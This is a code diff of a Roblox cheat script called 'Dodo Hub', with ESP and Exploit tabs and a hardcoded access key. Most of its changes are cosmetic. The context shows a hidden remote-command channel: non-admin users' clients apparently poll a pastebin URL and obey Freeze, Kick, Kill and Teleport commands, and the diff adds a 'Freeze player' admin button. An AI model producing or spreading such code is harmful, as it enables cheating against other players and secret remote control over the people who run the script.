@@ -94,13 +94,13 @@ local Window = Rayfield:CreateWindow({
    },
    KeySystem = false,
    KeySettings = {
-      Title = "Untitled",
+      Title = "Dodo Hub",
       Subtitle = "Key system",
-      Note = "No method of obtaining the key is provided",
+      Note = "NOTE: Get your key only once. After this, you will no longer need key anymore",
       FileName = "Key",
       SaveKey = true,
       GrabKeyFromSite = false,
-      Key = {"Hello"}
+      Key = {"Admin"}
    }
 })
 
@@ -132,7 +132,7 @@ local t3 = Window:CreateTab(" |  ESP", 130937742838884)
 local t4 = Window:CreateTab(" |  Exploit", 119319133251626)
 local t5 = Window:CreateTab(" |  Misc", 100155648971622)
 local t6 = Window:CreateTab(" |  Settings", 132834248211414)
-local sectionSur = t4:CreateSection("🚶 Survivor 🚶")
+local sectionSur = t4:CreateSection("⚪ Survivor ⚪")
 local player = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local pasteURL = "https://pastebin.com/raw/LpxN1hgG"
@@ -160,7 +160,7 @@ if ad == "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
     local ButtonCheck = t6:CreateButton({
             Name = "Check For Users",
             Callback = function()
-                sendCommand("Chat:DodoCA", "All")
+                sendCommand("Chat:Dodo Admin", "All")
             end,
     })
     
@@ -178,6 +178,12 @@ if ad == "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
             Name = "Kick player",
             Callback = function()
                 sendCommand("Kick", PlayerName)
+            end,
+    })
+    local ButtonFreeze = t6:CreateButton({
+            Name = "Freeze player",
+            Callback = function()
+                sendCommand("Freeze", PlayerName)
             end,
     })
 end
@@ -588,7 +594,7 @@ t4:CreateButton({
         end
     end,
 })
-t4:CreateSection("⚒️ Beast ⚒️")
+t4:CreateSection("🔴 Beast 🔴")
 -- auto rope
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -855,17 +861,17 @@ if ad ~= "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
     local pasteURL = "https://pastebin.com/raw/LpxN1hgG"
 
     local function applyCommand(command, target)
-        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local charactr = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 
         if command == "Freeze" then
-            for _, part in pairs(character:GetDescendants()) do
+            for _, part in pairs(charactr:GetDescendants()) do
                 if part:IsA("BasePart") then
                     part.Anchored = true
                 end
             end
 
         elseif command == "Unfreeze" then
-            for _, part in pairs(character:GetDescendants()) do
+            for _, part in pairs(charactr:GetDescendants()) do
                 if part:IsA("BasePart") then
                     part.Anchored = false
                 end
@@ -875,8 +881,8 @@ if ad ~= "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
             LocalPlayer:Kick("You were kicked by external command.")
 
         elseif command == "Kill" then
-            if character:FindFirstChild("Humanoid") then
-                character.Humanoid.Health = 0
+            if charactr:FindFirstChild("Humanoid") then
+                charactr.Humanoid.Health = 0
             end
 
         elseif command:match("^Teleport:") then
@@ -930,6 +936,7 @@ t5:CreateButton({
 setclipboard("https://discord.gg/EHVKqtJm")
 
 ]]
+
 
 
 
